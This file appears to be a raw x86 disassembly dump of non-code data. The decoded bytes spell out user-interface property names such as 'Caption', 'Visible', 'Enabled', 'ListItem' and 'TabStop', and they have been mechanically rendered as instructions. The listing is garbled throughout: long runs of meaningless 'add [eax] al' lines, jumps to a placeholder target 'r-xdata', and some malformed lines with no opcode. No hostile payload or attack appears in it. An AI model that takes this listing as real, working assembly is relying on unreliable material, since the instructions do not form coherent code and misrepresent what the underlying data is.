or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
insd
add [ eax ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
dec ecx
je r-xdata
pop es
je r-xdata
push ds
push esp
dec esp
push esi
inc ecx
jbe r-xdata
imul esp [ ebp + 0x77 ] 0x52410512
arpl [ gs : ebp + eax + 0x54 ] si
je r-xdata
add eax 0x63655241
add [ ebx ] ecx
inc esp
popa
ja r-xdata
insd
push ebx
outsb
jb r-xdata
or [ esi ] al
je r-xdata
inc ebx
add [ ebx + 0x43e580c0 ] cl
insd
insd
inc esp
je r-xdata
jb r-xdata
outsb
inc ebp
jb r-xdata
dec ecx
outsb
je r-xdata
jb r-xdata
je r-xdata
outsd
outsb
push es
push esp
push eax
or dl [ ebx + 0x74 ]
popad
imul ebp [ esi + 0x64 ] 0x74495409
insd
add [ esi + eax * 2 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
add eax 0x74617453
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
or al 0xdd
inc ebx
add [ eax ] al
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
insb
jb r-xdata
outsd
imul ebp [ esi + 0x74 ] 0x69460800
outsb
inc esp
popad
je r-xdata
imul esi [ ecx + ebp * 2 + 0x6f ] 0x5054066e
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x28 ] dh
insd
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
add [ gs : bp + di ] ecx
inc esp
popa
jne r-xdata
add [ 0x67617453 ] al
je r-xdata
jb r-xdata
or dl [ ebx + 0x74 ]
popad
add [ eax ] cl
inc ebp
outsb
dec ecx
outsb
js r-xdata
jae r-xdata
outsb
je r-xdata
add [ ecx + edx + 0x40 ] dh
popad
je r-xdata
je r-xdata
jb r-xdata
add [ ebx * 8 + 0x10000043 ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x1993ffc0 ] cl
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax - 0x1bffbc24 ] bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
push eax
outsd
imul ebp [ esi + 0x74 ] 0xa007265
push ebx
ja r-xdata
push esp
dec esp
push esi
dec edi
dec ecx
outsb
js r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add [ eax ] cl
adc eax 0x4f564c54
ja r-xdata
inc ebx
je r-xdata
imul ebp [ esi + 0x64 ] 0x69736f50
inc ebp
jbe r-xdata
dec ecx
outsb
js r-xdata
add [ eax ] cl
dec edi
insb
dec ecx
outsb
add [ eax ] cl
inc ebp
outsb
je r-xdata
add eax 0x65530608
outsb
jb r-xdata
or edx [ ecx + ecx * 2 + 0x74 ]
insd
jb r-xdata
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] 0x6e657645
insd
jb r-xdata
dec ecx
outsb
js r-xdata
or [ ebp + 0x6e ] al
add [ ecx ] cl
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
dec ecx
outsb
je r-xdata
jb r-xdata
jb r-xdata
dec ecx
outsb
je r-xdata
dec ecx
outsb
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
je r-xdata
outsb
jb r-xdata
dec ecx
outsb
je r-xdata
add [ eax + r-xdata ] dl
or [ esp + edx * 2 ] dl
dec esp
push esi
push ebx
jne r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax - 0x24 ] ah
inc ebx
add [ eax - 0x24 ] ah
inc ebx
add [ edx ] cl
push ebx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xa ] si
je r-xdata
je r-xdata
popad
je r-xdata
je r-xdata
je r-xdata
jb r-xdata
add ecx [ eax ]
push es
push ebx
outsb
dec ecx
outsb
js r-xdata
or [ ebp + 0x6e ] al
outsb
je r-xdata
out 0x43 al
jb r-xdata
fadd [ ebx ]
mov eax eax
and ch 0x43
ja r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
jb r-xdata
add al 0x8
push es
push ebx
outsb
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
insd
je r-xdata
add al 0x49
or edx [ ecx + ecx * 2 + 0x74 ]
insd
push ebx
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
dec edi
push ebx
je r-xdata
or [ edi + 0x6c ] cl
je r-xdata
jb r-xdata
outsb
outsw
push esp
imul esi [ eax + 0x45 ] 0x746e6576
add [ ebx ] al
or [ esi ] al
push ebx
outsb
jb r-xdata
push esp
adc [ eax ] al
mov eax eax
dec ecx
je r-xdata
jb r-xdata
outsw
push esp
jb r-xdata
or cl [ ecx + 0x6d ]
ja r-xdata
push ebx
pop es
je r-xdata
dec ecx
je r-xdata
jbe r-xdata
inc ebx
push 0x65676e61
inc ebp
push esp
adc [ eax ] al
int3
jbe r-xdata
outsb
adc [ ebx + edx * 2 + 0x65 ] dl
popad
jb r-xdata
or [ ecx + ebp * 2 + 0x72 ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
inc edx
outsd
outsd
insb
popad
outsb
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
pop es
dec ecx
je r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
je r-xdata
je r-xdata
fsubr st7
inc ebx
dec ecx
insd
popad
insd
imul esi [ eax + 0x6 ] 0x69727453
outsb
add [ si + 0x11 ] dh
inc eax
add [ eax - 0x28 ] dh
inc ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 - 0x15b1ffbd ] ah
inc ebx
add [ eax + 0x3 ] bh
add [ eax ] al
cmp al 0x26
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add al al
popad
dec ecx
outsb
js r-xdata
dec ecx
insd
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x49 ]
add [ ecx + edx + 0x40 ] dh
dec ecx
outsb
je r-xdata
dec ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
je r-xdata
insd
push ebx
je r-xdata
insd
je r-xdata
outsb
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add ah ch
dec ebp
inc esp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ esi + eax * 2 ] ah
inc esp
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add ah cl
insb
inc esp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
add al bl
dec ecx
je r-xdata
push ebx
jne r-xdata
insd
add [ edi ] al
jae r-xdata
dec esp
push esi
dec edi
ja r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add ah cl
out 0x43 al
add [ eax ] cl
sbb al 0x54
inc eax
add ah ah
adc [ eax ] al
js r-xdata
jb r-xdata
add [ edi ] eax
insd
pop es
dec ecx
outsb
insd
rcl [ ebp + eax * 2 + 0x444aec00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah dl
dec esp
inc esp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ ebx + eax * 4 + 0x5a140044 ] ah
inc esp
add [ edx * 2 + 0x6b000044 ] dh
inc esp
add ah ch
add [ eax + eax + 0x4c ] 0xffffff82
inc esp
add [ eax - 0x3ffbb7e ] cl
add [ eax + eax + 0x24 ] 0x13
inc esi
add [ eax - 0x27ffbb7d ] dh
pop esp
inc esp
add [ ebp + edx * 2 + 0x44 ] bh
add [ ebx + ebx * 2 ] cl
inc esp
add [ eax + 0x5b ] cl
inc esp
add [ esp + edi * 2 ] al
inc esp
add [ esp + edi * 2 + 0x44 ] bl
add ah cl
jl r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add al ch
insb
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
add [ eax + ecx * 2 ] cl
inc esp
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x27ffba6a ] cl
insd
or [ esi + 0x65 ] cl
ja r-xdata
je r-xdata
push [ ecx - 0x4f001301 ]
[ edi - 0x22005101 ]
add ah al
add [ eax + eax + 0x44 ] 0x7d
inc esp
add [ edx + ebx * 2 ] bh
inc esp
add [ edx + ebx * 2 + 0x44 ] ah
add [ eax - 0x27ffbba6 ] dh
pop edx
inc esp
add ah bh
jpe r-xdata
out 0x43 eax
add [ eax - 0x28 ] dh
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43e7dcc0 ] cl
inc eax
push esi
inc esp
add [ eax + 0x6e ] ch
inc esp
add [ eax + ebx * 2 + 0x5d5c0044 ] ch
inc esp
add [ eax + 0x70004476 ] bl
push esi
inc esp
add ah al
pop ecx
inc esp
add [ eax + 0x7f ] ch
inc esp
add [ eax - 0x6fffbb7c ] dh
jns r-xdata
add [ eax + 0x59 ] al
inc esp
add [ eax + eax ] bl
or eax 0x2fb010b0
mov al 0xe
mov al 0x4e
mov esp 0x4e0201
adc [ edx ] al
lldt [ 0x2b004701 ]
mov esp 0x7bb030
out dx eax
push [ ebx - 0x4e004d01 ]
add [ edi ] cl
push esp
inc ebx
add ah al
jns r-xdata
inc eax
je r-xdata
jne r-xdata
add [ edi + edi * 2 - 0x7e2bffbc ] bl
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ eax + 0x6b ] ch
inc esp
add [ eax ] ah
insb
inc esp
add [ eax + 0x1c00446b ] dh
push 0x44
add [ eax - 0x4fffbb96 ] dl
push 0x44
add al ch
imul eax [ eax + eax + 0x3c ] 0x6e
inc esp
add [ eax + 0x6d ] ch
inc esp
add [ esp + ebp * 2 + 0x44 ] cl
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 + 0x44 ] al
add al ah
push 0x44
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add ah ch
dec ebp
inc esp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + ebx * 2 ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ esi + eax * 2 ] ah
inc esp
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add ah cl
insb
inc esp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
add al al
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + ecx * 2 ] cl
inc esp
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
dec eax
xor al 0x40
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
mov eax eax
0xf070043 0x4354
rcl [ ebp + eax * 2 + 0x444aec00 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ edi + edx * 4 ] bh
inc ebp
add ah dl
dec esp
inc esp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ ebx + eax * 4 + 0x5a140044 ] ah
inc esp
add [ edx * 2 + 0x6b000044 ] dh
inc esp
add ah ch
add [ eax + eax + 0x4c ] 0xffffff82
inc esp
add [ eax - 0x3ffbb7e ] cl
add [ eax + eax + 0x24 ] 0x13
inc esi
add [ eax - 0x27ffbb7d ] dh
pop esp
inc esp
add [ ebp + edx * 2 + 0x44 ] bh
add [ ebx + ebx * 2 ] cl
inc esp
add [ eax + 0x5b ] cl
inc esp
add [ esp + edi * 2 ] al
inc esp
add [ esp + edi * 2 + 0x44 ] bl
add ah cl
jl r-xdata
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add al ch
insb
inc esp
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
imul eax [ eax ] 0x8
inc ebx
outsd
insd
inc ebx
je r-xdata
add ah al
add [ eax + eax + 0x44 ] 0x7d
inc esp
add [ edx + ebx * 2 ] bh
inc esp
add [ edx + ebx * 2 + 0x44 ] ah
add [ eax - 0x27ffbba6 ] dh
pop edx
inc esp
add ah bh
jpe r-xdata
add [ esi + ecx * 2 ] bh
insb
jae r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
add [ eax + 0x59 ] al
inc esp
add [ ecx ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
mov eax eax
adc al 0xec
inc ebx
add [ edi ] al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add [ gs : eax ] eax
inc esp
rol [ ebp ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or [ edx + 0x65 ] eax
jbe r-xdata
sub al 0x17
inc ebp
add [ edx + 0x1 ] ah
add bh bh
xchg esp eax
rol [ ebp ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
outsd
arpl [ edx + 0x79 ] ax
or al 0x8
inc ebp
add [ ecx ] ah
add bh bh
mov al [ 0x3c00454d ]
add al bh
jbe r-xdata
insb
pop es
inc ecx
insb
push esi
imul esp [ ebp + 0x77 ] r-xdata
pushad
0x6b0043 0x4308
adc eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xe4ff0001
rol [ ebp ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ edx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
push ebp
add [ eax + 0x2 ] ch
add bh bh
clc
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
fadd [ eax ]
inc ebp
add [ ebx ] bl
add bh bh
pushad
dec edi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add eax 0x67696c41
outsb
push esp
adc [ eax ] al
push 0xf8ff0002
add [ eax + eax ] bh
add dh bh
ror [ ebp + 0x45 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
add [ eax - 0xfffffb ] al
sbb [ eax ] al
jb r-xdata
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
push edi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410700
push ss
inc ebp
add [ ebx + 0x1 ] ah
add bh bh
push eax
rol [ ebp ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
or al [ ebx + 0x68 ]
arpl [ gs : ebx + 0x62 ] bp
xlat
inc ebx
add [ edx + eax ] bh
add bh bh
xor [ eax + 0x44 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
jo r-xdata
je r-xdata
outsd
insb
jne r-xdata
sbb [ eax ] eax
pop es
inc ebx
jb r-xdata
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
je r-xdata
jae r-xdata
inc esp
rol [ eax ] 0x45
outsb
jae r-xdata
add eax 0x6f6c6f43
jb r-xdata
add bh bh
in al dx
pop ebx
inc ebp
add [ eax ] cl
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ 0x18ff0000 ] 0x0
add [ eax ] eax
insb
test [ gs : esi ] dl
inc ebp
add [ ecx + eax ] ch
jmp [ eax + 0x10045c4 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
dec esi
push ss
inc ebp
add [ ecx + eax ] ah
call [ eax - 0x30 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add bh bh
and [ edi + 0x45 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
outsd
outsb
jae r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax 0x72440a00
popad
inc ebx
jne r-xdata
adc [ eax ] al
sub al [ edx ]
add bh bh
and [ ebp + 0x44 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or eax [ ebx + 0x6f ]
insb
jne r-xdata
outsd
js r-xdata
rcl [ ebx + 0x44 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ edx ] cl
inc ebx
push 0x626b6365
add bh bh
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
scasd [ edi ]
inc esi
add [ edx + eax ] dl
insb
dec edi
jne r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
inc [ eax + 0x5b ]
jae r-xdata
jb r-xdata
outsb
inc ebx
add bh bh
or al 0x55
jb r-xdata
inc esi
insb
popad
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
push ds
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3f00ffff ] ah
les eax [ ebp ]
in al 0xc4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
je r-xdata
adc [ eax ] al
jne r-xdata
inc ebp
add [ eax + 0x5b ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040021 ] al
add bh bh
inc eax
jb r-xdata
pop ebx
outsd
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jo r-xdata
pop ss
inc ebp
add [ ebp + 0x1 ] ah
add bh bh
add [ eax ] bh
add al [ eax ]
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
outsd
outsb
je r-xdata
and [ ecx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ eax + eax * 8 ]
inc ebp
in al 0x54
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
push cs
add bh bh
add [ eax ] ah
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
cmp [ esi ] ch
inc edx
add [ eax ] ch
pop es
inc ebp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
js r-xdata
add [ eax ] dl
inc eax
add [ esi + 0x2 ] dh
add bh bh
clc
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
push esp
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ eax ] al
add [ es : eax ] cl
dec eax
outsd
je r-xdata
add [ eax ] al
add [ bx + si ] dl
inc eax
add [ edi + 0x2 ] dh
add bh bh
inc eax
push esp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
or [ edi + 0x72 ] eax
imul esp [ esp + ecx * 2 + 0x69 ] 0x73656e
adc [ eax ] al
cmp [ edx ] al
add bh bh
in al dx
pop eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x69480d00
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + 0x2 ] bh
add [ edx + eax ] dh
add bh bh
adc al 0x59
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490b0029 ] al
arpl [ edi + 0x6e ] bp
jb r-xdata
inc esp
add al [ eax ]
imul ebp [ edi + 0x6e ] 0x43d8f873
add [ edx + eax ] ch
dec edi
jo r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or ecx [ ecx + 0x63 ]
outsd
outsb
arpl [ ebx - 0x44 ] bp
fld [ ebx ]
jns r-xdata
popad
popad
je r-xdata
outsb
jb r-xdata
add [ 0x774f0900 ] ch
insd
jae r-xdata
push 0x1004454
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ esi ] cl
dec eax
outsd
je r-xdata
add bh bh
adc [ eax ] al
jpe r-xdata
or [ edx + 0x6f ] edx
ja r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x2 ] al
add bh bh
mov esp 0x1004454
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c0b002b ] al
popad
jb r-xdata
sub [ esi ] eax
sbb [ edx ] al
add bh bh
clc
jo r-xdata
add bh bh
and al 0x70
inc esp
clc
fadd [ ebx ]
sub al 0x2
jb r-xdata
rcl [ esp + eax * 2 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
add bh bh
jb r-xdata
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
push cs
inc edx
jb r-xdata
add [ eax ] al
add [ cs : ecx ] cl
dec edi
ja r-xdata
dec ecx
call [ eax + 0x1004454 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax 0x774f0900
add [ edx + eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905002a ] al
je r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6f500900
outsb
je r-xdata
push ebx
jb r-xdata
adc [ eax ] al
sub [ edx ] al
add bh bh
hlt
insd
popad
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ ecx + 0x72 ]
dec ecx
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
aaa
add [ 0x776f6853 ] cl
push edi
outsb
je r-xdata
add [ eax ] al
add [ ebx ] dh
add [ edx ] cl
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
call [ eax ]
pop esp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
push 0x6948776f
outsb
je r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
push eax
popad
jb r-xdata
add [ esi ] cl
ja r-xdata
add [ ecx + eax * 4 ] bl
inc esp
adc [ eax ] al
or [ ecx - 0x7f1bffbc ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
jb r-xdata
inc ecx
jb r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530b0039 ] al
insd
sub [ esi ] eax
sbb al 0x2
ja r-xdata
outsb
jne r-xdata
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push ss
add al [ eax ]
inc [ eax ]
pop ecx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
das
add [ eax ] cl
push edx
popad
add al [ eax ]
[ eax ]
push esp
jns r-xdata
or [ ebx + 0x6f ] dl
popad
jae r-xdata
inc ebx
add [ ecx ] ch
add al [ eax ]
push [ eax + 0x70 ]
add [ eax ] dl
inc eax
add [ edx + eax + 0x7f90ff00 ] dl
inc esp
jo r-xdata
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090035 ] al
outsd
popad
insb
insb
dec ecx
insd
popad
jae r-xdata
or edx [ ebx + 0x6d ]
outsb
dec eax
popad
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
[ eax + 0x71 ]

add bh bh
jo r-xdata
outsd
jb r-xdata
add [ ss : ecx ] dl
push ebx
push 0x6f43776f
insb
jne r-xdata
adc [ eax ] al
sub eax [ edx ]
add bh bh
nop
push ebp
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x28ff0002
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ gs : ecx ] ch
inc esi
add [ eax ] ah
add al [ eax ]
jmp eax
adc [ eax ] al
cdq
add [ eax ] al
[ ebx + ebx * 2 + 0x5b640045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080038 ] al
xor al 0x0
adc [ eax ] al
0xc0ff0000 0x455b
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cmp eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f180041 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
aas
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x48656c62
